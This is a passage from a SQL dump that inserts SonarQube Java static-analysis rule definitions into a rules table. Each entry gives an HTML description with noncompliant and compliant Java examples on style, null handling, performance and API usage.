  public int compareTo(Foo foo) { /* ... */ }      // Noncompliant as the equals(Object obj) method is not overridden
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public class Foo implements Comparable&lt;Foo&gt; {
  @Override
  public int compareTo(Foo foo) { /* ... */ }      // Compliant

  @Override
  public boolean equals(Object obj) { /* ... */ }
}
</pre>', 1, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '15min', NULL, NULL, NULL, false, 'HTML', 1510817812906, 1510817812906, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (875, 'Generic wildcard types should not be used in return parameters', 'S1452', NULL, 'squid', '<p>It is highly recommended <strong>not</strong> to use wildcard types as return types. Because the type inference rules are fairly complex it is
unlikely the user of that API will know how to use it correctly. </p>
<p>Let''s take the example of method returning a "List&lt;? extends Animal&gt;". Is it possible on this list to add a Dog, a Cat, ... we simply don''t
know. And neither does the compiler, which is why it will not allow such a direct use. The use of wildcard types should be limited to method
parameters.</p>
<p>This rule raises an issue when a method returns a wildcard type. </p>
<h2>Noncompliant Code Example</h2>
<pre>
List&lt;? extends Animal&gt; getAnimals(){...}
</pre>
<h2>Compliant Solution</h2>
<pre>
List&lt;Animal&gt; getAnimals(){...}
</pre>
<p>or</p>
<pre>
List&lt;Dog&gt; getAnimals(){...}
</pre>', 3, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '20min', NULL, NULL, 'pitfall', false, 'HTML', 1510817812907, 1510817812908, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (876, 'An abstract class should have both abstract and concrete methods', 'S1694', NULL, 'squid', '<p>The purpose of an abstract class is to provide some heritable behaviors while also defining methods which must be implemented by sub-classes.</p>
<p>A class with no abstract methods that was made abstract purely to prevent instantiation should be converted to a concrete class (i.e. remove the
<code>abstract</code> keyword) with a private constructor.</p>
<p>A class with only abstract methods and no inheritable behavior should be converted to an interface.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public abstract class Animal {  // Noncompliant; should be an interface
  abstract void move();
  abstract void feed();
}

public abstract class Color {  // Noncompliant; should be concrete with a private constructor
  private int red = 0;
  private int green = 0;
  private int blue = 0;

  public int getRed() {
    return red;
  }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public interface Animal {
  void move();
  void feed();
}

public class Color {
  private int red = 0;
  private int green = 0;
  private int blue = 0;

  private Color () {}

  public int getRed() {
    return red;
  }
}

public abstract class Lamp {

  private boolean switchLamp=false;

  public abstract void glow();

  public void flipSwitch() {
    switchLamp = !switchLamp;
    if (switchLamp) {
      glow();
    }
  }
}
</pre>', 1, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '5min', NULL, NULL, 'convention', false, 'HTML', 1510817812909, 1510817812909, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (877, 'Spring "@Controller" classes should not use "@Scope"', 'S3750', NULL, 'squid', '<p>Spring <code>@Controller</code>s, <code>@Service</code>s, and <code>@Repository</code>s have <code>singleton</code> scope by default, meaning only
one instance of the class is ever instantiated in the application. Defining any other scope for one of these class types will result in needless churn
as new instances are created and destroyed. In a busy web application, this could cause a significant amount of needless additional load on the
server.</p>
<p>This rule raises an issue when the <code>@Scope</code> annotation is applied to a <code>@Controller</code>, <code>@Service</code>, or
<code>@Repository</code> with any value but "singleton". <code>@Scope("singleton")</code> is redundant, but ignored.</p>
<h2>Noncompliant Code Example</h2>
<pre>
@Scope("prototype")  // Noncompliant
@Controller
public class HelloWorld {
</pre>
<h2>Compliant Solution</h2>
<pre>
@Controller
public class HelloWorld {
</pre>', 2, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '2min', NULL, NULL, 'spring', false, 'HTML', 1510817812910, 1510817812910, 2);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (878, '"NullPointerException" should not be explicitly thrown', 'S1695', NULL, 'squid', '<p>A <code>NullPointerException</code> should indicate that a <code>null</code> value was unexpectedly encountered. Good programming practice dictates
that code is structured to avoid NPE''s. </p>
<p>Explicitly throwing <code>NullPointerException</code> forces a method''s callers to explicitly catch it, rather than coding to avoid it. Further, it
makes it difficult to distinguish between the unexpectedly-encountered <code>null</code> value and the condition which causes the method to purposely
throw an NPE.</p>
<p>If an NPE is being thrown to indicate that a parameter to the method should not have been null, use the <code>@NotNull</code> annotation
instead.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public void doSomething (String aString) throws NullPointerException {
     throw new NullPointerException();
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public void doSomething (@NotNull String aString) {
}
</pre>', 2, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '10min', NULL, NULL, 'pitfall', false, 'HTML', 1510817812911, 1510817812911, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (879, 'Public methods should not contain selector arguments', 'S2301', NULL, 'squid', '<p>A selector argument is a <code>boolean</code> argument that''s used to determine which of two paths to take through a method. Specifying such a
parameter may seem innocuous, particularly if it''s well named. </p>
<p>Unfortunately, the maintainers of the code calling the method won''t see the parameter name, only its value. They''ll be forced either to guess at
the meaning or to take extra time to look the method up.</p>
<p>Instead, separate methods should be written.</p>
<p>This rule finds methods with a <code>boolean</code> that''s used to determine which path to take through the method.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public String tempt(String name, boolean ofAge) {
  if (ofAge) {
    offerLiquor(name);
  } else {
    offerCandy(name);
  }
}

// ...
public void corrupt() {
  tempt("Joe", false); // does this mean not to temp Joe?
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public void temptAdult(String name) {
  offerLiquor(name);
}

public void temptChild(String name) {
    offerCandy(name);
}

// ...
public void corrupt() {
  age &lt; legalAge ? temptChild("Joe") : temptAdult("Joe");
}
</pre>', 2, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '15min', NULL, NULL, 'design', false, 'HTML', 1510817812912, 1510817812912, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (883, 'Short-circuit logic should be used to prevent null pointer dereferences in conditionals', 'S1697', NULL, 'squid', '<p>When either the equality operator in a null test or the logical operator that follows it is reversed, the code has the appearance of safely
null-testing the object before dereferencing it. Unfortunately the effect is just the opposite - the object is null-tested and then dereferenced
<em>only</em> if it is null, leading to a guaranteed null pointer dereference.</p>
<h2>Noncompliant Code Example</h2>
<pre>
if (str == null &amp;&amp; str.length() == 0) {
  System.out.println("String is empty");
}

if (str != null || str.length() &gt; 0) {
  System.out.println("String is not empty");
}
</pre>
<h2>Compliant Solution</h2>
<pre>
if (str == null || str.length() == 0) {
  System.out.println("String is empty");
}

if (str != null &amp;&amp; str.length() &gt; 0) {
  System.out.println("String is not empty");
}
</pre>
<h2>Deprecated</h2>
<p>This rule is deprecated; use {rule:squid:S2259} instead.</p>', 2, NULL, 'DEPRECATED', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '2min', NULL, NULL, NULL, false, 'HTML', 1510817812916, 1510817812916, 2);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (880, '"NullPointerException" should not be caught', 'S1696', NULL, 'squid', '<p><code>NullPointerException</code> should be avoided, not caught. Any situation in which <code>NullPointerException</code> is explicitly caught can
easily be converted to a <code>null</code> test, and any behavior being carried out in the catch block can easily be moved to the "is null" branch of
the conditional.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public int lengthPlus(String str) {
  int len = 2;
  try {
    len += str.length();
  }
  catch (NullPointerException e) {
    log.info("argument was null");
  }
  return len;
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public int lengthPlus(String str) {
  int len = 2;

  if (str != null) {
    len += str.length();
  }
  else {
    log.info("argument was null");
  }
  return len;
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href="http://cwe.mitre.org/data/definitions/395.html">MITRE, CWE-395</a> - Use of NullPointerException Catch to Detect NULL Pointer
  Dereference </li>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/BIB3AQ">CERT, ERR08-J.</a> - Do not catch NullPointerException or any of its ancestors
  </li>
</ul>', 2, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '5min', NULL, NULL, 'cert,cwe,error-handling', false, 'HTML', 1510817812913, 1510817812913, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (881, '"Arrays.stream" should be used for primitive arrays', 'S3631', NULL, 'squid', '<p>For arrays of objects, <code>Arrays.asList(T ... a).stream()</code> and <code>Arrays.stream(array)</code> are basically equivalent in terms of
performance. However, for arrays of primitives, using <code>Arrays.asList</code> will force the construction of a list of boxed types, and then use
<em>that</em> last as a stream. On the other hand, <code>Arrays.stream</code> uses the appropriate primitive stream type (<code>IntStream</code>,
<code>LongStream</code>, <code>DoubleStream</code>) when applicable, with much better performance.</p>
<h2>Noncompliant Code Example</h2>
<pre>
Arrays.asList("a1", "a2", "b1", "c2", "c1").stream()
    .filter(...)
    .forEach(...);

Arrays.asList(1, 2, 3, 4).stream() // Noncompliant
    .filter(...)
    .forEach(...);
</pre>
<h2>Compliant Solution</h2>
<pre>
Arrays.asList("a1", "a2", "b1", "c2", "c1").stream()
    .filter(...)
    .forEach(...);

int[] intArray = new int[]{1, 2, 3, 4};
Arrays.stream(intArray)
    .filter(...)
    .forEach(...);
</pre>', 2, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '5min', NULL, NULL, 'performance', false, 'HTML', 1510817812914, 1510817812914, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (882, 'The members of an interface declaration or class should appear in a pre-defined order', 'S1213', NULL, 'squid', '<p>According to the Java Code Conventions as defined by Oracle, the members of a class or interface declaration should appear in the following order
in the source files:</p>
<ul>
  <li> Class and instance variables </li>
  <li> Constructors </li>
  <li> Methods </li>
</ul>
<h2>Noncompliant Code Example</h2>
<pre>
public class Foo{
   private int field = 0;
   public boolean isTrue() {...}
   public Foo() {...}                         // Noncompliant, constructor defined after methods
   public static final int OPEN = 4;  //Noncompliant, variable defined after constructors and methods
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public class Foo{
   public static final int OPEN = 4;
   private int field = 0;
   public Foo() {...}
   public boolean isTrue() {...}
}
</pre>', 1, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '5min', NULL, NULL, 'convention', false, 'HTML', 1510817812915, 1510817812915, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (884, 'Constants should not be defined in interfaces', 'S1214', NULL, 'squid', '<p>According to Joshua Bloch, author of "Effective Java":</p>
<blockquote>
  <p>The constant interface pattern is a poor use of interfaces. </p>
  <p>That a class uses some constants internally is an implementation detail.</p>
  <p>Implementing a constant interface causes this implementation detail to leak into the class''s exported API. It is of no consequence to the users
  of a class that the class implements a constant interface. In fact, it may even confuse them. Worse, it represents a commitment: if in a future
  release the class is modified so that it no longer needs to use the constants, it still must implement the interface to ensure binary compatibility.
  If a nonfinal class implements a constant interface,</p>
  <p>all of its subclasses will have their namespaces polluted by the constants in the interface.</p>
</blockquote>
<h2>Noncompliant Code Example</h2>
<pre>
interface Status {                      // Noncompliant
   int OPEN = 1;
   int CLOSED = 2;
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public enum Status {                    // Compliant
  OPEN,
  CLOSED;
}
</pre>
<p>or</p>
<pre>
public final class Status {             // Compliant
   public static final int OPEN = 1;
   public static final int CLOSED = 2;
}
</pre>', 3, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '10min', NULL, NULL, 'bad-practice', false, 'HTML', 1510817812917, 1510817812917, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (885, '"==" and "!=" should not be used when "equals" is overridden', 'S1698', NULL, 'squid', '<p>It is equivalent to use the equality <code>==</code> operator and the <code>equals</code> method to compare two objects if the <code>equals</code>
method inherited from <code>Object</code> has not been overridden. In this case both checks compare the object references.</p>
<p>But as soon as <code>equals</code> is overridden, two objects not having the same reference but having the same value can be equal. This rule spots
suspicious uses of <code>==</code> and <code>!=</code> operators on objects whose <code>equals</code> methods are overridden.</p>
<h2>Noncompliant Code Example</h2>
<pre>
String firstName = getFirstName();   //String is a good example of a class overriding the equals method
String lastName = getLastName();

if (firstName == lastName) { ... };   // Non-compliant, the two literals can have the same value and yet the condition is false
</pre>
<h2>Compliant Solution</h2>
<pre>
String firstName = getFirstName();
String lastName = getLastName();

if (firstName != null &amp;&amp; firstName.equals(lastName)) { ... };
</pre>
<h2>Exceptions</h2>
<p>Comparing two instances of the <code>Class</code> object will not raise an issue.</p>
<pre>
Class c;
if(c == Integer.class) { //No issue raised
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href="http://cwe.mitre.org/data/definitions/595.html">MITRE, CWE-595</a> - Comparison of Object References Instead of Object Contents </li>
  <li> <a href="http://cwe.mitre.org/data/definitions/597.html">MITRE, CWE-597</a> - Use of Wrong Operator in String Comparison </li>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/wwD1AQ">CERT, EXP03-J.</a> - Do not use the equality operators when comparing values of
  boxed primitives </li>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/8AEqAQ">CERT, EXP50-J.</a> - Do not confuse abstract object equality with reference
  equality </li>
</ul>', 1, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '2min', NULL, NULL, 'cert,cwe,suspicious', false, 'HTML', 1510817812918, 1510817812918, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (886, 'Nested "enum"s should not be declared static', 'S2786', NULL, 'squid', '<p>According to <a href="http://docs.oracle.com/javase/specs/jls/se7/html/jls-8.html#jls-8.9">the docs</a>:</p>
<blockquote>
  Nested enum types are implicitly
  <code>static</code>.
</blockquote>
<p>So there''s no need to declare them <code>static</code> explicitly.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public class Flower {
  static enum Color { // Noncompliant; static is redundant here
    RED, YELLOW, BLUE, ORANGE
  }

  // ...
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public class Flower {
  enum Color { // Compliant
    RED, YELLOW, BLUE, ORANGE
  }

  // ...
}
</pre>', 1, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '2min', NULL, NULL, 'clumsy', false, 'HTML', 1510817812919, 1510817812919, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (887, 'Files should not be empty', 'EmptyFile', 'S2309', 'squid', '<p>Files with no lines of code clutter a project and should be removed.</p>
<h2>Noncompliant Code Example</h2>
<pre>
//package org.foo;
//
//public class Bar {}
</pre>', 1, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '5min', NULL, NULL, 'unused', false, 'HTML', 1510817812920, 1510817812920, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (888, '"super.finalize()" should be called at the end of "Object.finalize()" implementations', 'ObjectFinalizeOverridenCallsSuperFinalizeCheck', 'S1114', 'squid', '<p>Overriding the <code>Object.finalize()</code> method must be done with caution to dispose some system resources.</p>
<p>Calling the <code>super.finalize()</code> at the end of this method implementation is highly recommended in case parent implementations must also
dispose some system resources.</p>
<h2>Noncompliant Code Example</h2>
<pre>
protected void finalize() {   // Noncompliant; no call to super.finalize();
  releaseSomeResources();
}

protected void finalize() {
  super.finalize();  // Noncompliant; this call should come last
  releaseSomeResources();
}
</pre>
<h2>Compliant Solution</h2>
<pre>
protected void finalize() {
  releaseSomeResources();
  super.finalize();
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href="http://cwe.mitre.org/data/definitions/568.html">MITRE, CWE-568</a> - finalize() Method Without super.finalize() </li>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/H4cbAQ">CERT, MET12-J.</a> - Do not use finalizers </li>
</ul>', 3, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '5min', NULL, NULL, 'cert,cwe', false, 'HTML', 1510817812921, 1510817812922, 2);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (889, '"File.createTempFile" should not be used to create a directory', 'S2976', NULL, 'squid', '<p>Using <code>File.createTempFile</code> as the first step in creating a temporary directory causes a race condition and is inherently unreliable and
insecure. Instead, <code>Files.createTempDirectory</code> (Java 7+) or a library function such as Guava''s similarly-named
<code>Files.createTempDir</code> should be used.</p>
<p>This rule raises an issue when the following steps are taken in immediate sequence:</p>
<ul>
  <li> call to <code>File.createTempFile</code> </li>
  <li> delete resulting file </li>
  <li> call <code>mkdir</code> on the File object </li>
</ul>
<p><strong>Note</strong> that this rule is automatically disabled when the project''s <code>sonar.java.source</code> is lower than <code>7</code>.</p>
<h2>Noncompliant Code Example</h2>
<pre>
File tempDir;
tempDir = File.createTempFile("", ".");
tempDir.delete();
tempDir.mkdir();  // Noncompliant
</pre>
<h2>Compliant Solution</h2>
<pre>
Path tempPath = Files.createTempDirectory("");
File tempDir = tempPath.toFile();
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://www.owasp.org/index.php/Top_10_2013-A9-Using_Components_with_Known_Vulnerabilities">OWAPS Top Ten 2013 Category A9</a> - Using
  Components with Known Vulnerabilities </li>
</ul>', 3, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '5min', NULL, NULL, 'owasp-a9', false, 'HTML', 1510817812922, 1510817812923, 3);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (896, 'Sets with elements that are enum values should be replaced with EnumSet', 'S1641', NULL, 'squid', '<p>When all the elements in a Set are values from the same enum, the Set can be replaced with an EnumSet, which can be much more efficient than other
sets because the underlying data structure is a simple bitmap.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public class MyClass {

  public enum COLOR {
    RED, GREEN, BLUE, ORANGE;
  }

  public void doSomething() {
    Set&lt;COLOR&gt; warm = new HashSet&lt;COLOR&gt;();
    warm.add(COLORS.RED);
    warm.add(COLORS.ORANGE);
  }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public class MyClass {

  public enum COLOR {
    RED, GREEN, BLUE, ORANGE;
  }

  public void doSomething() {
    EnumSet&lt;COLOR&gt; warm = EnumSet.of(COLOR.RED, COLOR.ORANGE);
  }
}
</pre>', 1, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '5min', NULL, NULL, 'performance', false, 'HTML', 1510817812931, 1510817812932, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (890, '"clone" should not be overridden', 'S2975', NULL, 'squid', '<p>Many consider <code>clone</code> and <code>Cloneable</code> broken in Java, largely because the rules for overriding <code>clone</code> are tricky
and difficult to get right, according to Joshua Bloch:</p>
<blockquote>
  Object''s clone method is very tricky. It''s based on field copies, and it''s "extra-linguistic." It creates an object without calling a constructor.
  There are no guarantees that it preserves the invariants established by the constructors. There have been lots of bugs over the years, both in and
  outside Sun, stemming from the fact that if you just call super.clone repeatedly up the chain until you have cloned an object, you have a shallow
  copy of the object. The clone generally shares state with the object being cloned. If that state is mutable, you don''t have two independent objects.
  If you modify one, the other changes as well. And all of a sudden, you get random behavior.
</blockquote>
<p>A copy constructor or copy factory should be used instead.</p>
<p>This rule raises an issue when <code>clone</code> is overridden, whether or not <code>Cloneable</code> is implemented.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public class MyClass {
  // ...

  public Object clone() { // Noncompliant
    //...
  }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public class MyClass {
  // ...

  MyClass (MyClass source) {
    //...
  }
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href="http://www.artima.com/intv/bloch13.html">Copy Constructor versus Cloning</a> </li>
</ul>
<h3>See Also</h3>
<ul>
  <li> {rule:squid:S2157} - "Cloneables" should implement "clone" </li>
  <li> {rule:squid:S1182} - Classes that override "clone" should be "Cloneable" and call "super.clone()" </li>
</ul>', 4, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '30min', NULL, NULL, 'suspicious', false, 'HTML', 1510817812923, 1510817812924, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (891, '"Map.get" and value test should be replaced with single method call', 'S3824', NULL, 'squid', '<p>It''s a common pattern to test the result of a <code>java.util.Map.get()</code> against <code>null</code> before proceeding with adding or changing
the value in the map. However the <code>java.util.Map</code> API offers a significantly better alternative in the form of the
<code>computeIfPresent()</code> and <code>computeIfAbsent()</code> methods. Using these instead leads to cleaner and more readable code.</p>
<p><strong>Note</strong> that this rule is automatically disabled when the project''s <code>sonar.java.source</code> is not 8.</p>
<h2>Noncompliant Code Example</h2>
<pre>
V value = map.get(key);
if (value == null) {  // Noncompliant
  value = V.createFor(key);
  if (value != null) {
    map.put(key, value);
  }
}
return value;
</pre>
<h2>Compliant Solution</h2>
<pre>
return map.computeIfAbsent(key, k -&gt; V.createFor(k));
</pre>', 2, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '10min', NULL, NULL, 'java8', false, 'HTML', 1510817812925, 1510817812925, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (892, '"catch" clauses should do more than rethrow', 'S2737', NULL, 'squid', '<p>A <code>catch</code> clause that only rethrows the caught exception has the same effect as omitting the <code>catch</code> altogether and letting
it bubble up automatically, but with more code and the additional detrement of leaving maintainers scratching their heads. </p>
<p>Such clauses should either be eliminated or populated with the appropriate logic.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public String readFile(File f) {
  StringBuilder sb = new StringBuilder();
  try {
    FileReader fileReader = new FileReader(fileName);
    BufferedReader bufferedReader = new BufferedReader(fileReader);

    while((line = bufferedReader.readLine()) != null) {
      //...
  }
  catch (IOException e) {  // Noncompliant
    throw e;
  }
  return sb.toString();
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public String readFile(File f) {
  StringBuilder sb = new StringBuilder();
  try {
    FileReader fileReader = new FileReader(fileName);
    BufferedReader bufferedReader = new BufferedReader(fileReader);

    while((line = bufferedReader.readLine()) != null) {
      //...
  }
  catch (IOException e) {
    logger.LogError(e);
    throw e;
  }
  return sb.toString();
}
</pre>
<p>or</p>
<pre>
public String readFile(File f) throws IOException {
  StringBuilder sb = new StringBuilder();
  FileReader fileReader = new FileReader(fileName);
  BufferedReader bufferedReader = new BufferedReader(fileReader);

  while((line = bufferedReader.readLine()) != null) {
    //...

  return sb.toString();
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/SIIyAQ">CERT, MSC12-CPP.</a> - Detect and remove code that has no effect </li>
</ul>', 1, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '5min', NULL, NULL, 'cert,clumsy,finding,unused', false, 'HTML', 1510817812926, 1510817812927, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (893, 'Assertions should be complete', 'S2970', NULL, 'squid', '<p>It is very easy to write incomplete assertions when using some test frameworks. This rule enforces complete assertions in the following cases:</p>
<ul>
  <li> Fest: <code>assertThat</code> is not followed by an assertion invocation </li>
  <li> AssertJ: <code>assertThat</code> is not followed by an assertion invocation </li>
  <li> Mockito: <code>verify</code> is not followed by a method invocation </li>
</ul>
<p>In such cases, what is intended to be a test doesn''t actually verify anything</p>
<h2>Noncompliant Code Example</h2>
<pre>
// Fest
boolean result = performAction();
// let''s now check that result value is true
assertThat(result); // Noncompliant; nothing is actually checked, the test passes whether "result" is true or false

// Mockito
